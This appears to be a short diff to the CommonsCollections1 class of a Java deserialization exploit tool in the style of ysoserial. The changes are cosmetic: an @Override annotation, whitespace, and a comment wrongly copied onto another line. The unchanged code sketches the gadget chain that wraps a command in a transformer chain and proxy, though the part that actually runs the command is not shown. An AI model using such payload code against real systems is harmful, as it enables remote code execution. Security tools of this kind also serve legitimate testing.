@@ -42,6 +42,7 @@ import java.util.Map;
  */
 public class CommonsCollections1 implements ObjectPayload<InvocationHandler> {
 
+    @Override
     public InvocationHandler getObject(PayloadType type, String... param) throws Exception {
         String command = param[0];
         final Transformer transformerChain = new ChainedTransformer(
@@ -54,12 +55,12 @@ public class CommonsCollections1 implements ObjectPayload<InvocationHandler> {
         final Map               mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
         final InvocationHandler handler  = Gadgets.createMemoizedInvocationHandler(mapProxy);
 
-        Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
+        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);// arm with actual transformer chain
 
         return handler;
     }
 
     public static boolean isApplicableJavaVersion() {
-        return JavaVersion.isAnnInvHUniversalMethodImpl();
+        return JavaVersion.isAnnInvHUniversalMethodImpl();// arm with actual transformer chain
     }
 }
